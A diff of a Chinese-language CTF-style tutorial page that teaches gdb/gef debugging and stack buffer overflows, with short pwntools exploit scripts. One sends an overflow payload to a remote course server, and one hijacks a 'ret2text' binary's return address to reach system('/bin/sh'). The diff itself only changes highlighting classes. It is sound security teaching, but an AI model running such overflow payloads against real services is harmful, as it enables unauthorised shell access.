-<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span> <span class="c1"># 开启debug模式,可以记录发送和收到的字符串
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span> <span class="c1"># 开启debug模式,可以记录发送和收到的字符串
 </span>
 <span class="n">sh</span> <span class="o">=</span> <span class="n">romote</span><span class="p">(</span><span class="s">'202.204.62.222'</span><span class="p">,</span><span class="mi">30008</span><span class="p">)</span> <span class="c1"># 只需要修改这一句话,填写对应的ip地址和端口 remote('ip', port)
 #sh = process('./a')  #构造与程序交互的对象
 </span>
 <span class="n">payload</span> <span class="o">=</span> <span class="s">'a'</span> <span class="o">*</span> <span class="mi">40</span> <span class="o">+</span> <span class="s">'bbbb'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08049182</span><span class="p">)</span>  <span class="c1"># 构造payload
 </span>
-<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>  <span class="c1"># 将字符串发送给程序
+<span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>  <span class="c1"># 将字符串发送给程序
 </span>
-<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span> <span class="c1"># 将代码变为手动交互
+<span class="n">sh</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span> <span class="c1"># 将代码变为手动交互
 </span></code></pre></div></div>
 
 <p>最后来介绍一下动态调试技巧,主要是关于gdb的使用.我相信8成的人写代码仍然使用十分复古的调试方法:</p>
@@ -1123,7 +1123,7 @@ $
   <li>查看反汇编执行</li>
 </ol>
 
-<p>  我们仍然用个栗子讲解,首先下载并打开<a href="https://github.com/Explainaur/USTB_Assembly_Documention/raw/master/src/example_2/ret2text">附件</a>ret2text,然后你可以输入<code class="highlighter-rouge">ls</code>命令查看一下这个文件是不是绿色的,如果不是则说明没有可执行权限,你需要输入以下命令对其进行原谅:</p>
+<p>  我们仍然用个栗子讲解,首先下载并打开<a href="https://github.com/Explainaur/USTB_Assembly_Documention/raw/master/src/example_2/ret2text">附件</a>ret2text,然后你可以输入<code class="language-plaintext highlighter-rouge">ls</code>命令查看一下这个文件是不是绿色的,如果不是则说明没有可执行权限,你需要输入以下命令对其进行原谅:</p>
 
 <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chmod</span> +x ret2txt
 </code></pre></div></div>
@@ -1192,7 +1192,7 @@ $
 
 </code></pre></div></div>
 
-<p>  可以看到十分明显的gets()函数,然后我们又发现secure()函数存在<code class="highlighter-rouge">system("/bin/sh")</code>:</p>
+<p>  可以看到十分明显的gets()函数,然后我们又发现secure()函数存在<code class="language-plaintext highlighter-rouge">system("/bin/sh")</code>:</p>
 
 <pre><code class="language-assembly"> 804863a:       c7 04 24 63 87 04 08    movl   $0x8048763,(%esp)   ;这里传递参数 "/bin/sh" 复习一下传参方式哦
  8048641:       e8 4a fe ff ff          call   8048490 &lt;system@plt&gt;
@@ -1228,7 +1228,7 @@ gdb&gt; start
 <span class="nb">echo</span> <span class="s2">"source ~/peda/peda.py"</span> <span class="o">&gt;&gt;</span> ~/.gdbinit
 </code></pre></div></div>
 
-<p>  接下来输入<code class="highlighter-rouge">disas</code>可以看到即将会执行的汇编指令:</p>
+<p>  接下来输入<code class="language-plaintext highlighter-rouge">disas</code>可以看到即将会执行的汇编指令:</p>
 
 <pre><code class="language-assembly">gef➤  disas
 Dump of assembler code for function main:
@@ -1260,7 +1260,7 @@ Dump of assembler code for function main:
    0x080486c5 &lt;+125&gt;:   ret    
 </code></pre>
 
-<p>  若安装了插件输入<code class="highlighter-rouge">register</code>指令可以查看寄存器信息:</p>
+<p>  若安装了插件输入<code class="language-plaintext highlighter-rouge">register</code>指令可以查看寄存器信息:</p>
 
 <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gef➤  register
 <span class="nv">$eax</span>   : 0xf7f90dc8  →  0xffffd0cc  →  0xffffd2cc  →  <span class="s2">"CLUTTER_IM_MODULE=fcitx"</span>
@@ -1276,7 +1276,7 @@ Dump of assembler code for function main:
 <span class="nv">$cs</span>: 0x0023 <span class="nv">$ss</span>: 0x002b <span class="nv">$ds</span>: 0x002b <span class="nv">$es</span>: 0x002b <span class="nv">$fs</span>: 0x0000 <span class="nv">$gs</span>: 0x0063 
 gef➤  
 </code></pre></div></div>
-<p>  若没有安装插件则使用<code class="highlighter-rouge">print $eax</code>打印相关寄存器信息.
+<p>  若没有安装插件则使用<code class="language-plaintext highlighter-rouge">print $eax</code>打印相关寄存器信息.
   接着输入n或者s可以单步进行调试,他们的区别是:</p>
 
 <ul>
@@ -1305,7 +1305,7 @@ Breakpoint 1, 0x080486ae <span class="k">in </span>main <span class="o">()</span
 <span class="nv">$eip</span>   : 0x080486ae  →  &lt;main+102&gt; call 0x8048460 &lt;gets@plt&gt;
 </code></pre></div></div>
 
-<p>  这里我们看到esp是 0xffffcd40,ebp 为具体的 payload 如下 0xffffcdc8，同时 s 相对于 esp 的索引为 <code class="highlighter-rouge">[esp+0x1c]</code>，所以，s 的地址为 0xffffcd5c，所以 s 相对于 ebp 的偏移为 0x6C，所以相对于返回地址的偏移为 0x6c+4。</p>
+<p>  这里我们看到esp是 0xffffcd40,ebp 为具体的 payload 如下 0xffffcdc8，同时 s 相对于 esp 的索引为 <code class="language-plaintext highlighter-rouge">[esp+0x1c]</code>，所以，s 的地址为 0xffffcd5c，所以 s 相对于 ebp 的偏移为 0x6C，所以相对于返回地址的偏移为 0x6c+4。</p>
 
 <p>exp如下:</p>
 
@@ -1314,8 +1314,8 @@ Breakpoint 1, 0x080486ae <span class="k">in </span>main <span class="o">()</span
 
 <span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./ret2text'</span><span class="p">)</span>
 <span class="n">target</span> <span class="o">=</span> <span class="mh">0x804863a</span>
-<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'A'</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x6c</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">target</span><span class="p">))</span>
-<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'A'</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x6c</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">target</span><span class="p">))</span>
+<span class="n">sh</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div></div>
 
 <p>  现在你已经稍微入点高级编程门了.</p>
